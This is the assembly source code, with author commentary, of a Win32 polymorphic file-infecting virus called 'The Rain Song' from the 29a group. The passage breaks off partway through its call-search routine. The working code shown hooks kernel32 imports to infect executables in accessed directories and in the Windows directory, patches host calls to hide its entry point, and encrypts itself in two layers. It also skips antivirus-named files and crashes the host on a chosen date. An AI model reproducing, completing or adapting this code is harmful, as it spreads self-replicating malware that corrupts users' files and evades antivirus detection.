
;
;                                                  ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
;                                                  ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
;     The Rain Song                                 ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
;     Coded by Bumblebee/29a                       ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
;                                                  ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
;   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;   ³ Words from the author ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;   . The best way to  code a virus: listening  Led Zeppelin  (i'm  not so
;   old, but the best is ever good ;). And in the time  i was  coding this
;   bug i became  hooked again by  the Dr. Asimov.  'Pelude to Foundation'
;   it's the book. Here in  spain the books are going even more expensive,
;   but there are  cheap editions  of Asimov's work  (about  6 Euros). The
;   name of the  virus is from the amazing  song by  Led Zeppelin, of coz.
;   But the payload is a little tribute to Isaac Asimov. Very little.
;   This virus triggers its payload in the death date of Asimov.
;   May be you're interested in sci-fi, or just looking for a good book to
;   evade yourself from reality, there  are some titles i love (this could
;   be a nice order to read them):
;
;   Basics about the Foundation:
;
;       Foundation
;       Foundation and Empire
;       Second Foundation
;
;   This books could be readed before or after the basics:
;
;       Prelude to Foundation
;       Forward the Foundation
;
;   It's true the titles say nothing about the book contents. hehehe. This
;   is Asimov ;) I  feel you'll like them. Books made me be a bit as i am.
;   There is nothing that makes you more  as you are that those things you
;   choose to ignore. Hey! take that ;)
;
;   . This is my first per-process virus and also my first virus with EPO.
;   Don't spect too much of it. It isn't anything you haven't seen before,
;   but with  Bumblebee style. May be you're thinking in this way asm32 is
;   going  more  and more  close to macro  coding (hi ya urgo32!). I'm not
;   here for the money ;) Only  for fun. And  fun is not  ever innovate...
;   If you think this virus is worth less releasing let me know!
;
;   ÚÄÄÄÄÄÄÄÄÄÄÄÄ¿
;   ³ Disclaimer ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÙ
;   . This is the source  code of a VIRUS. The author  is not responsabile
;   of any  damage that  may occur  due to the assembly of this file.  Use
;   it at your own risk.
;
;   ÚÄÄÄÄÄÄÄÄÄÄ¿
;   ³ Features ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   ÀÄÄÄÄÄÄÄÄÄÄÙ
;   . Works under win32 systems:
;                               Windows 9x
;                               Windows Nt
;                               Windows 2000
;                               Future versions?
;   . Uses SEH during  scan kernel process. If the virus gets control from
;   EPO i test 1st for the last used address and if fails i test using the
;   Win9x, WinNt and Win2k fixed  kernel addresses. In this case  it could
;   not work in future versions of win32. But if i can rely in the stack i
;   hope it will work also if the kernel changes its address.
;   . Gets needed  API scanning kernel32.dll in memory using CRC32 instead
;   of names.
;   . Infects PE files increasing last section.
;   . Increases virtual size the amount of bytes needed to have memory for
;   temporary data. (virt size>phys size)
;   . Takes care of relocations in execution time.
;   . Uses size padding as infection sign.
;   . Avoids infect most used AV.
;   . Per-process resident hooking:
;                               CreateFileA
;                               MoveFileA
;                               CopyFileA
;                               CreateProcessA
;                               SetFileAttributesA
;                               GetFileAttributesA
;                               SearchPathA
;   . Gets  the path from  the hooked  calls to the APIs  and infects  the
;   files found in the directory.
;   . Has a runtime part that infects files in windows directory.
;   . Infects PE with the extension EXE and SCR.
;   . It has 2 layers of encryption. First polymorphic and second a simple
;   not loop. This is due  to 1st layer uses  32 bits key and i don't want
;   bytes unencrypted.
;   . Has  EPO (Entry Point Obscuring) tech patching a  call into the code
;   section of the  infected  program. Supports also the more standard way
;   of patching  PE header, but  avoids it if possible  trying to do light
;   EPO adding a jmp to the virus at the end of the original code section.
;
;
;   AVP Description ÄÄ[comments]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   Win32.Rainsong 
;
;This is a dangerous per-process memory resident parasitic polymorphic
;Win32 virus. It searches for PE EXE files (Windows executable files) in
;Windows directory and infects them. Then it stays in Windows memory as a
;component of host application and affects PE EXE files that are accessed
;by host application.
;
;While infecting the virus writes itself to the end of the file by increasing
;the size of last file section. The virus uses "Entry Point Obscuring" methods
;and while infecting it does not modify program's entry address. To receive
;control when infected program is run, the virus scans victim file body, looks
;for a CALL command and replaces it with "JUMP VirusEntry" code. As a result
;the virus gets control not immediately at infected file start, but only in
;case the patched file code receives control.
;
;The virus has a bug and often corrupt files while infecting them.
;[This is true due i don't check if the import section has write attributes]
;[RainSong will corrupt all the windows file in win98 se :(]
;
;The virus avoids several anti-virus files infection, it detects them by two
;first letters in file name: AV*, AN*, DR*, ID*, OD*, TB*, F-*.
;[They NEVER analize the algo!!! A file called ?????AV.??? is never infected]
;[Why they insist in the 'two fist letters' shit?]
;
;On April 6th it generates Windows error message with the text:
;
;ASIMOV Jan.2.1920 - Apr.6.1992
;
;The virus also contains the text:
;
;< The Rain Song Coded By Bumblebee/29a > 
;
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
;   The source is commented so... have fun!
;   After i've released it i've found 2 little bugs :(
;   But don't worry, it work fine. See comments.
;
;
;                                                       The way of the bee
;
.486p
locals
.model flat,STDCALL

        extrn           ExitProcess:PROC        ; needed for 1st generation

        vSize           equ     vEnd-vBegin
        crptSize        equ     crptEND-crptINI
        PADDING         equ     101
        STRINGTOP       equ     160

; from BC++ Win32 API on-line Reference
WIN32_FIND_DATA         struc
dwFileAttributes        dd      0
dwLowDateTime0          dd      ?       ; creation
dwHigDateTime0          dd      ?
dwLowDateTime1          dd      ?       ; last access
dwHigDateTime1          dd      ?
dwLowDateTime2          dd      ?       ; last write
dwHigDateTime2          dd      ?
nFileSizeHigh           dd      ?
nFileSizeLow            dd      ?
dwReserved              dd      0,0
cFileName               db      260 dup(0)
cAlternateFilename      db      14 dup(0)
                        db      2 dup(0)
WIN32_FIND_DATA         ends

.DATA
        ; dummy data
        db      'WARNING - This is a virus carrier - WARNING'

.CODE
vBegin  label   byte
inicio:
        ; call for the polymorphic decryptor
        call    crypt

crptINI label byte
        ; a lame 2nd layer
        call    secondLayerDecrypt
crptSecondINI label byte

        ; to store the return to host address
        push    offset fakeHost
hostRET equ     $-4
        pushad
        ; to support relocs
        push    offset inicio
virusEP equ     $-4

        ; get delta offset
        call    getDelta

        ; setup relocations
        pop     eax                             ; get stored virus EP
        lea     edx,inicio+ebp                  ; get current
        sub     edx,eax                         ; calc displacement
        add     dword ptr [esp+20h],edx         ; fix hostRET
        add     dword ptr [imageBase+ebp],edx   ; fix image base

        ; Get Kernel32 address
        ; 1st check if we are in a EPO address
        mov     eax,dword ptr [EPOAddr+ebp]
        or      eax,eax
        jz      getK32notEPO

        ; we canot rely on stack... try some addresses
tryFix:
        mov     esi,dword ptr [kernel32+ebp]    ; test latest
        inc     esi
        call    GetKernel32
        jnc     getAPIsNow

        mov     esi,077e00001h                  ; test for win2k
        call    GetKernel32
        jnc     getAPIsNow

        mov     esi,077f00001h                  ; test for winNt
        call    GetKernel32
        jnc     getAPIsNow

        mov     esi,0bff70001h                  ; test for win9x
        call    GetKernel32
        jc      returnHost
        jmp     getAPIsNow

getK32notEPO:
        ; use the value in the stack
        mov     esi,dword ptr [esp+24h]
        call    GetKernel32
        jc      tryFix

getAPIsNow:
        ; now get APIs using CRC32
        mov     edi,12345678h
kernel32        equ $-4
        mov     esi,edi
        mov     esi,dword ptr [esi+3ch]
        add     esi,edi
        mov     esi,dword ptr [esi+78h]
        add     esi,edi
        add     esi,1ch

        lodsd
        add     eax,edi
        mov     dword ptr [address+ebp],eax
        lodsd
        add     eax,edi
        mov     dword ptr [names+ebp],eax
        lodsd
        add     eax,edi
        mov     dword ptr [ordinals+ebp],eax

        sub     esi,16
        lodsd
        mov     dword ptr [nexports+ebp],eax

        xor     edx,edx
        mov     dword ptr [expcount+ebp],edx
        lea     eax,FSTAPI+ebp

searchl:
        mov     esi,dword ptr [names+ebp]
        add     esi,edx
        mov     esi,dword ptr [esi]
        add     esi,edi
        push    eax edx edi
        xor     edi,edi
        movzx   di,byte ptr [eax+4]
        call    CRC32
        xchg    ebx,eax
        pop     edi edx eax
        cmp     ebx,dword ptr [eax]
        je      fFound
        add     edx,4
        inc     dword ptr [expcount+ebp]
        push    edx
        mov     edx,dword ptr [expcount+ebp]
        cmp     dword ptr [nexports+ebp],edx
        pop     edx
        je      returnHost
        jmp     searchl
fFound:
        shr     edx,1
        add     edx,dword ptr [ordinals+ebp]
        xor     ebx,ebx
        mov     bx,word ptr [edx]
        shl     ebx,2
        add     ebx,dword ptr [address+ebp]
        mov     ecx,dword ptr [ebx]
        add     ecx,edi

        mov     dword ptr [eax+5],ecx
        add     eax,9
        xor     edx,edx
        mov     dword ptr [expcount+ebp],edx
        lea     ecx,ENDAPI+ebp
        cmp     eax,ecx
        jb      searchl

        ; we must make a memory copy of the virus and work there
        ; the original copy it's patched to return host.
        ; This is necessary due we could be called from a call more
        ; than once... just think what happens when you decrypt twice...
        push    00000040h
        push    00001000h OR 00002000h
        push    (vSize+1000h)
        push    0h
        call    dword ptr [_VirtualAlloc+ebp]
        or      eax,eax
        jz      returnHost

        lea     esi,inicio+ebp
        mov     edi,eax
        mov     ecx,vSize
        rep     movsb
        lea     esi,hostRET-1
        lea     edi,inicio+ebp
        mov     ecx,5
        rep     movsb
        mov     byte ptr [edi],0c3h
        add     eax,offset memCopy-offset inicio
        push    eax
        ret

memCopy:
        ; get delta offset another time
        call    getDelta

        lea     edx,fileSize+ebp                ; check for Asimov
        push    edx                             ; death date
        call    dword ptr [_GetSystemTime+ebp]

        lea     edx,fileSize+ebp
        cmp     word ptr [edx+2],4
        jne     skipPay
        cmp     word ptr [edx+6],6
        jne     skipPay

        lea     edx,message+ebp
        push    edx
        xor     eax,eax
        push    eax
        call    dword ptr [_FatalAppExitA+ebp]   ; bye bye ;)

skipPay:
        ; alloc a temporary buffer to generate the poly sample
        ; of the virus ready to infect
        push    00000004h
        push    00001000h OR 00002000h
        push    (vSize+1000h)
        push    0h
        call    dword ptr [_VirtualAlloc+ebp]
        or      eax,eax
        jz      returnHost

        mov     dword ptr [memHnd+ebp],eax

        ; the same polymorphic routine is used for each infection
        ; in the current execution of the virus
        call    dword ptr [_GetTickCount+ebp]
        mov     edi,dword ptr [memHnd+ebp]
        add     edi,vSize
        mov     ecx,(crptSize/4)-(4-(crptSize MOD 4))
        call    GenDCrpt
        ; store the size of the sample (for infection process)
        ; and calc the virtual size
        mov     dword ptr [virtsize+ebp],vSize
        cmp     eax,BUFFERSIZE
        jb      decryptorSmall
        add     dword ptr [virtsize+ebp],eax
        jmp     virtSizeOk
decryptorSmall:
        add     dword ptr [virtsize+ebp],BUFFERSIZE
virtSizeOk:
        add     eax,vSize
        mov     dword ptr [gensize+ebp],eax

        ; Hook the API to get per-process residency
        ; Notice this must be called before any infection
        call    hookApi

        lea     esi,stringBuffer+ebp            ; get current directory
        push    esi
        push    STRINGTOP
        call    dword ptr [_GetCurrentDirectoryA+ebp]
        or      eax,eax
        jz      returnHost

        push    STRINGTOP                       ; get windows directory
        lea     esi,tmpPath+ebp
        push    esi
        call    dword ptr [_GetWindowsDirectoryA+ebp]
        or      eax,eax
        jz      returnHost

        lea     esi,tmpPath+ebp                 ; goto windows directory
        push    esi
        call    dword ptr [_SetCurrentDirectoryA+ebp]
        or      eax,eax
        jz      returnHost

        call    infectDir                       ; infect!! buahahahah!
                                                ; estoooo
        lea     esi,stringBuffer+ebp            ; go back home ;)
        push    esi
        call    dword ptr [_SetCurrentDirectoryA+ebp]

returnHost:
        popad
        ret
;
; Returns Delta offset into ebp.
;
getDelta:
        call    delta
delta:
        pop     ebp
        sub     ebp,offset delta
        ret
;
; General hook. This routine is for all the hooks.
; We have into esi the path to analize, the address of the
; original API in the stack (plus a pushad) and the delta
; offset into ebp. I use a semaphore 'cause the virus doesn't support
; multithread. In case hooked API is called by other thread while
; the virus is in the infection process could be fatal. I'm not sure
; 100% this is necessary but... ;)
;
generalHook:
        pushfd
        cld
        ; set sem to working
        mov     byte ptr [semHook+ebp],1

        call    stringUp
        jc      hookInfectionFail

        push    edi
        lea     edx,stringBuffer+ebp
        push    edx
        call    dword ptr [_GetFileAttributesA+ebp]
        pop     edi
        inc     eax
        jz      hookInfectionFail
        dec     eax

        and     eax,00000010h                   ; it's a directory?
        jnz     infectPath

        lea     edx,stringBuffer+ebp
        cmp     word ptr [edx+1],'\:'           ; absolute path?
        je      getPath

        cmp     word ptr [edx],'\\'             ; absolute path?
        jne     infectCurrent

        ; if it's an absolute path to a file we quit the
        ; filename and try the directory
getPath:
        cmp     byte ptr [edi],'\'
        je      pathOk
        dec     edi
        cmp     edx,edi
        je      hookInfectionFail
        jmp     getPath

pathOk:
        mov     dword ptr [edi],0               ; now we have a path

        ; infects the path changing directory
infectPath:
        ; get current directory
        lea     esi,tmpPath+ebp
        push    esi
        push    STRINGTOP
        call    dword ptr [_GetCurrentDirectoryA+ebp]
        or      eax,eax
        jz      hookInfectionFail

        ; set current directory to path
        lea     esi,stringBuffer+ebp
        push    esi
        call    dword ptr [_SetCurrentDirectoryA+ebp]
        or      eax,eax
        jz      hookInfectionFail

        call    infectDir

        ; restore current directory
        lea     esi,tmpPath+ebp
        push    esi
        call    dword ptr [_SetCurrentDirectoryA+ebp]

        jmp     hookInfectionFail

        ; infects current directory 'cause we haven't any path
        ; to check (and the accessed file it's just there!)
infectCurrent:
        call    infectDir

hookInfectionFail:
        ; set sem to free
        mov     byte ptr [semHook+ebp],0
        popfd
        popad
        ret
;
; Nice macro ;)
;
@hook   macro   ApiAddress
        push    eax
        pushad
        call    getDelta
        mov     eax,dword ptr [ApiAddress+ebp]
        mov     dword ptr [esp+20h],eax
        mov     esi,dword ptr [esp+28h]

        or      esi,esi                         ; skip NULLs in filename
        jz      @@skipThisCall

        cmp     byte ptr [semHook+ebp],0
        je      generalHook
@@skipThisCall:
        popad
        ret
endm
;
; The hooks.
;
Hook0:
      @hook     _CreateFileA
Hook1:
      @hook     _MoveFileA
Hook2:
      @hook     _CopyFileA
Hook3:
      @hook     _CreateProcessA
Hook4:
      @hook     _SetFileAttributesA
Hook5:
      @hook     _GetFileAttributesA
Hook6:
      @hook     _SearchPathA
Hook7:                                  ; this data it's included but
      @hook     _SetCurrentDirectoryA   ; not used... ops
                                        ; i can remove it, but better it
                                        ; fits the released binary
                                        ; i realized this bug after release
;
; This routine hooks the API that gives the virus per-process residency.
; The image base address is stored in the infection process.
;
hookApi:
        pushad
        ; init the sem to free
        mov     byte ptr [semHook+ebp],0
        mov     edx,400000h
imageBase       equ $-4
        cmp     word ptr [edx],'ZM'
        jne     noHook
        mov     edi,edx
        add     edi,dword ptr [edx+3ch]
        cmp     word ptr [edi],'EP'
        jne     noHook
        mov     edi,dword ptr [edi+80h]         ; RVA import
        add     edi,edx
searchK32Imp:
        mov     esi,dword ptr [edi+0ch]         ; get name
        or      esi,esi
        jz      noHook
        add     esi,edx
        push    edi                             ; save (stringUp doesn't)
        call    stringUp
        pop     edi
        jc      nextName
        lea     esi,stringBuffer+ebp
        cmp     dword ptr [esi],'NREK'          ; look for Kernel32 module
        jne     nextName
        cmp     dword ptr [esi+4],'23LE'
        je      k32ImpFound
nextName:
        add     edi,14h
        mov     esi,dword ptr [edi]
        or      esi,esi
        jz      noHook
        jmp     searchK32Imp
k32ImpFound:
        mov     esi,dword ptr [edi+10h]         ; get address table
        or      esi,esi
        jz      noHook
        add     esi,edx
        lea     ecx,HOOKTABLEEND+ebp
nextImp:                                        ; search for APIs
        lea     edx,HOOKTABLEBEGIN+ebp
        lodsd
        or      eax,eax
        jz      noHook
checkNextAPI:
        mov     edi,dword ptr [edx]
        cmp     eax,dword ptr [edi+ebp]
        je      doHook
        add     edx,8
        cmp     edx,ecx
        jne     checkNextAPI
        jmp     nextImp
doHook:
        mov     eax,dword ptr [edx+4]
        add     eax,ebp
        mov     dword ptr [esi-4],eax
        add     edx,8
        cmp     edx,ecx
        jne     nextImp
noHook:
        popad
        ret
;
; Changes to upper case the string by esi storing into stringBuffer.
; Sets carry flag if our string buffer is small. Returns in edi the
; end of the string into the buffer. Requires SEH.
;
stringUp:
        push    esi eax
        lea     edi,stringBuffer+ebp
        mov     eax,edi
        add     eax,STRINGTOP
stringUpLoop:
        cmp     eax,edi
        jne     continueStringUp
        stc
        jmp     stringUpOut
continueStringUp:
        movsb
        cmp     byte ptr [esi-1],'a'
        jb      skipThisChar
        cmp     byte ptr [esi-1],'z'
        ja      skipThisChar
        add     byte ptr [edi-1],'A'-'a'
skipThisChar:
        cmp     byte ptr [esi-1],0
        jne     stringUpLoop
        dec     edi
        clc
stringUpOut:
        pop     eax esi
        ret
;
; This routine gets Kernel32 address. Uses SEH.
; The main purpose of this routine is search for the k32 address using
; a 'guess' address from the stack. But i cannot rely on the stack when
; the virus starts from EPO. Look the pieze of code that calls this
; routine to see how to fix it easily.
; Take a look to the article by Lethal Mind/29a from 29a#4 for more
; information about this method.
;
GetKernel32:
        pushad
        xor     edx,edx
        lea     eax,dword ptr [esp-8h]
        xchg    eax,dword ptr fs:[edx]
        lea     edi,GetKernel32Exception+ebp
        push    edi
        push    eax

GetKernel32Loop:
        dec     esi
        cmp     word ptr [esi],'ZM'             ; 'poda' -> this makes algo
        jne     GetKernel32Loop                 ; faster
        mov     dx,word ptr [esi+3ch]
        test    dx,0f800h
        jnz     GetKernel32Loop
        cmp     esi,dword ptr [esi+edx+34h]
        jne     GetKernel32Loop
        mov     dword ptr [kernel32+ebp],esi

        xor     edi,edi
        pop     dword ptr fs:[edi]
        pop     eax
        popad
        clc
        ret

GetKernel32Exception:
        xor     edi,edi
        mov     eax,dword ptr fs:[edi]
        mov     esp,dword ptr [eax]
        xor     edi,edi
        pop     dword ptr fs:[edi]
        pop     eax
        popad
        stc
        ret
;
; This routine makes CRC32.
;
CRC32:
	cld
        xor     ecx,ecx
        dec     ecx
	mov     edx,ecx
	push    ebx
NextByteCRC:
	xor     eax,eax
	xor     ebx,ebx
	lodsb
	xor     al,cl
	mov     cl,ch
	mov     ch,dl
	mov     dl,dh
	mov     dh,8
NextBitCRC:
	shr     bx,1
	rcr     ax,1
	jnc     NoCRC
	xor     ax,08320h
	xor     bx,0EDB8h
NoCRC:
        dec     dh
	jnz     NextBitCRC
	xor     ecx,eax
	xor     edx,ebx
        dec     edi
	jnz     NextByteCRC
	pop     ebx
	not     edx
	not     ecx
	mov     eax,edx
	rol     eax,16
	mov     ax,cx
	ret
;
; Updates the virus sample ready to infect in our memory buffer.
;
updateVSample:
        lea     esi,vBegin+ebp
        mov     edi,dword ptr [memHnd+ebp]
        mov     ecx,vSize
        rep     movsb

        mov     ecx,crptSecondEND-crptSecondINI
        mov     esi,crptSecondINI-vBegin
        add     esi,dword ptr [memHnd+ebp]
secondEnLayerLoop:
        not     byte ptr [esi]
        inc     esi
        loop    secondEnLayerLoop

        mov     ecx,dword ptr [CodeSize+ebp]
        mov     esi,crptINI-vBegin
        add     esi,dword ptr [memHnd+ebp]
        mov     eax,dword ptr [CrptKey+ebp]
encrptLoop:
        xor     dword ptr [esi],eax
        add     esi,4
        loop    encrptLoop
        ret
;
; Infects PE file increasing last section.
;
; ESI: addr of file name of PE to infect.
;
infect:
        pushad
        mov     dword ptr [fNameAddr+ebp],esi

        push    esi
        push    esi
        call    dword ptr [_GetFileAttributesA+ebp]
        pop     esi
        inc     eax
        jz      infectionError
        dec     eax

        mov     dword ptr [fileAttrib+ebp],eax

        push    esi
        push    00000080h
        push    esi
        call    dword ptr [_SetFileAttributesA+ebp]
        pop     esi
        or      eax,eax
        jz      infectionError

        xor     eax,eax
        push    eax
        push    00000080h
        push    00000003h
        push    eax
        push    eax
        push    80000000h OR 40000000h
        push    esi
        call    dword ptr [_CreateFileA+ebp]
        inc     eax
        jz      infectionErrorAttrib
        dec     eax

        mov     dword ptr [fHnd+ebp],eax

        push    0h
        push    eax
        call    dword ptr [_GetFileSize+ebp]
        inc     eax
        jz      infectionErrorClose
        dec     eax

        mov     dword ptr [fileSize+ebp],eax

        lea     edi,fileTime2+ebp
        push    edi
        lea     edi,fileTime1+ebp
        push    edi
        lea     edi,fileTime0+ebp
        push    edi
        push    dword ptr [fHnd+ebp]
        call    dword ptr [_GetFileTime+ebp]
        or      eax,eax
        jz      infectionErrorClose

        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    00000004h
        push    eax
        push    dword ptr [fHnd+ebp]
        call    dword ptr [_CreateFileMappingA+ebp]
        or      eax,eax
        jz      infectionErrorClose

        mov     dword ptr [fhmap+ebp],eax

        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    00000004h OR 00000002h
        push    dword ptr [fhmap+ebp]
        call    dword ptr [_MapViewOfFile+ebp]
        or      eax,eax
        jz      infectionErrorCloseMap

        mov     dword ptr [mapMem+ebp],eax

        mov     edi,eax
        cmp     word ptr [edi],'ZM'
        jne     infectionErrorCloseUnmap

        add     edi,dword ptr [edi+3ch]
        cmp     eax,edi
        ja      infectionErrorCloseUnmap        ; avoid fucking headers
        add     eax,dword ptr [fileSize+ebp]
        cmp     eax,edi
        jb      infectionErrorCloseUnmap        ; avoid fucking headers
        cmp     word ptr [edi],'EP'
        jne     infectionErrorCloseUnmap

        mov     edx,dword ptr [edi+16h]         ; test it's a valid PE
        test    edx,2h                          ; i want executable
        jz      infectionErrorCloseUnmap
        and     edx,2000h                       ; i don't want DLL
        jnz     infectionErrorCloseUnmap
        mov     dx,word ptr [edi+5ch]
        dec     edx                             ; i don't want NATIVE
        jz      infectionErrorCloseUnmap

        mov     edx,edi

        mov     esi,edi
        mov     eax,18h
        add     ax,word ptr [edi+14h]
        add     edi,eax
        mov     dword ptr [fstSec+ebp],edi

        push    edx
        mov     cx,word ptr [esi+06h]
        mov     ax,28h
        dec     cx
        mul     cx
        add     edi,eax
        pop     edx

        test    dword ptr [edi+24h],10000000h   ; avoid this kind of section
        jnz     infectionErrorCloseUnmap        ; we can corrupt it!

        test    dword ptr [edi+24h],0e0000020h  ; mmm... This is infected yet
        jz      infectionErrorCloseUnmap        ; another bug! must be jnz

        mov     eax,dword ptr [edi+10h]         ; i rely on the headers...
        add     eax,dword ptr [edi+14h]
        mov     dword ptr [fileSize+ebp],eax

        sub     eax,dword ptr [edi+14h]         ; calc our RVA
        add     eax,dword ptr [edi+0ch]
        mov     dword ptr [myRVA+ebp],eax
        ; save virus entry point to calc relocations in
        ; execution time
        add     eax,dword ptr [esi+34h]
        mov     dword ptr [virusEP+ebp],eax

        mov     eax,dword ptr [edi+08h]         ; fix the virtual size
        push    edx                             ; if needed
        mov     ecx,dword ptr [edx+38h]         ; some PE have strange
        xor     edx,edx                         ; virt size (cdplayer p.e.)
        div     ecx
        inc     eax
        or      edx,edx
        jz      rvaFixDone
        xor     edx,edx
        mul     ecx

        mov     dword ptr [edi+08h],eax         ; save the fixed virt size
rvaFixDone:

        ; save image base for hook API
        mov     edx,dword ptr [esi+34h]
        mov     dword ptr [imageBase+ebp],edx
        pop     edx

        call    searchEPO                       ; Search for a call
        jc      notEPO

        push    edi edx ecx                     ; patch the call
        mov     edx,dword ptr [myRVA+ebp]
        add     edx,dword ptr [esi+34h]         ; edx = dest rva
        mov     edi,dword ptr [EPORva+ebp]
        add     edi,dword ptr [esi+34h]         ; edi = call rva
        sub     edx,edi
        sub     edx,5                           ; edx patch the call
        mov     ecx,dword ptr [EPOAddr+ebp]
        xchg    dword ptr [ecx+1],edx
        add     edx,edi                         ; get the rva
        add     edx,5
        mov     dword ptr [hostRET+ebp],edx     ; and store it ;)
        pop     ecx edx edi

        jmp     yeahEPO
notEPO:
        call    lightEPO                        ; try light EPO
        jc      notNotEPO

        push    edx ecx                         ; add the jump
        mov     ecx,dword ptr [myRVA+ebp]
        add     ecx,dword ptr [esi+34h]         ; ecx = dest rva
        mov     edx,dword ptr [EPORva+ebp]
        mov     dword ptr [myRVA+ebp],edx
        add     edx,dword ptr [esi+34h]         ; edx = jmp rva
        sub     ecx,edx
        sub     ecx,5                           ; ecx the addr jmp
        mov     edx,dword ptr [EPOAddr+ebp]
        mov     byte ptr [edx],0e9h
        mov     dword ptr [edx+1],ecx
        pop     ecx edx
        ; now lets the header be patched with this data ;)

notNotEPO:
        ; if i can't found a nice call to patch and i can't add
        ; a jump in the end of the code section i use the non-EPO
        ; infection. This could be a problem for the wild time 
        ; of the virus 'cause heuristics can fake it easily
        ; but we want to be infectious ;)
        push    edi                             ; store new ep and get old
        mov     edi,dword ptr [myRVA+ebp]       ; set edi=new ep
        mov     dword ptr [EPOAddr+ebp],0       ; getk32 changes if epo!

        xchg    edi,dword ptr [esi+28h]         ; get host EP and set new
        add     edi,dword ptr [esi+34h]
        mov     dword ptr [hostRET+ebp],edi     ; save it
        pop     edi
yeahEPO:
        push    edx                             ; calc the new virtual size
        mov     eax,dword ptr [virtsize+ebp]    ; for the section
        mov     ecx,dword ptr [edx+38h]
        xor     edx,edx
        div     ecx
        inc     eax
        xor     edx,edx
        mul     ecx
        pop     edx

        add     dword ptr [edi+08h],eax         ; fix the virtual size
        add     dword ptr [edx+50h],eax         ; fix the image size

        or      dword ptr [edi+24h],0e0000020h  ; set the properties

        push    edx                             ; calc new size for
        mov     eax,dword ptr [gensize+ebp]     ; the section
        mov     ecx,dword ptr [edx+3ch]
        xor     edx,edx
        div     ecx
        inc     eax
        xor     edx,edx
        mul     ecx
        pop     edx

        add     dword ptr [edi+10h],eax         ; store the phys size

        push    edx                             ; calc file padding
        mov     ecx,PADDING                     ; (infection sign)
        add     eax,dword ptr [fileSize+ebp]
        xor     edx,edx
        div     ecx
        inc     eax
        xor     edx,edx
        mul     ecx
        mov     dword ptr [pad+ebp],eax
        pop     edx

        ; update the virus sample ready to infect.
        call    updateVSample

        push    dword ptr [mapMem+ebp]
        call    dword ptr [_UnmapViewOfFile+ebp]

        push    dword ptr [fhmap+ebp]
        call    dword ptr [_CloseHandle+ebp]

        xor     eax,eax
        push    eax
        push    dword ptr [pad+ebp]
        push    eax
        push    00000004h
        push    eax
        push    dword ptr [fHnd+ebp]
        call    dword ptr [_CreateFileMappingA+ebp]
        or      eax,eax
        jz      infectionErrorClose

        mov     dword ptr [fhmap+ebp],eax

        xor     eax,eax
        push    dword ptr [pad+ebp]
        push    eax
        push    eax
        push    00000004h OR 00000002h
        push    dword ptr [fhmap+ebp]
        call    dword ptr [_MapViewOfFile+ebp]
        or      eax,eax
        jz      infectionErrorCloseMap

        mov     dword ptr [mapMem+ebp],eax

        mov     ecx,dword ptr [gensize+ebp]
        mov     esi,dword ptr [memHnd+ebp]
        mov     edi,eax
        add     edi,dword ptr [fileSize+ebp]
        rep     movsb

        xchg    ecx,eax                         ; Why i want the padding
        mov     eax,edi                         ; to be zeroes?
        sub     eax,ecx                         ; bah only one 'pijada'
        mov     ecx,dword ptr [pad+ebp]
        sub     ecx,eax
        xor     eax,eax
        rep     stosb

infectionErrorCloseUnmap:
        push    dword ptr [mapMem+ebp]
        call    dword ptr [_UnmapViewOfFile+ebp]

infectionErrorCloseMap:
        push    dword ptr [fhmap+ebp]
        call    dword ptr [_CloseHandle+ebp]

        lea     edi,fileTime2+ebp
        push    edi
        lea     edi,fileTime1+ebp
        push    edi
        lea     edi,fileTime0+ebp
        push    edi
        push    dword ptr [fHnd+ebp]
        call    dword ptr [_SetFileTime+ebp]

infectionErrorClose:
        push    dword ptr [fHnd+ebp]
        call    dword ptr [_CloseHandle+ebp]

infectionErrorAttrib:
        push    dword ptr [fileAttrib+ebp]
        push    dword ptr [fNameAddr+ebp]
        call    dword ptr [_SetFileAttributesA+ebp]

infectionError:
        popad
        ret

;
; This my 'search EPO' routine. Searches for a call into the code section
; that points to:
;
;      push     ebp
;      mov      ebp,esp
;
; This is the way the high level lenguages get the arguments used to call
; a procedure. If this code is found i assume the call found it's correct
; and i patch it to jump into the virus.
;
; I tested selecting the call randomly, but this is not needed. There
; could be calls that points the desired code and call that are not
; useful for the virus. Av cannot know wich is the call patched utill
; it finds it. Moreover using 1st found call i'm more sure that the virus
; will be executed! And this is good enought to fuck most cool heuristics.
;
searchEPO:
        pushad
        mov     edi,dword ptr [esi+28h]         ; get host EP

        xor     ecx,ecx
        mov     cx,word ptr [esi+06h]           ; number of sections
        mov     esi,dword ptr [fstSec+ebp]      ; get 1st section addr

sectionLoop:                                    ; look for code section
        mov     ebx,dword ptr [esi+0ch]
        add     ebx,dword ptr [esi+08h]         ; test it's inside this
        cmp     edi,ebx                         ; section
        jb      sectionFound
        add     esi,28h
        dec     ecx
        jnz     sectionLoop
        stc
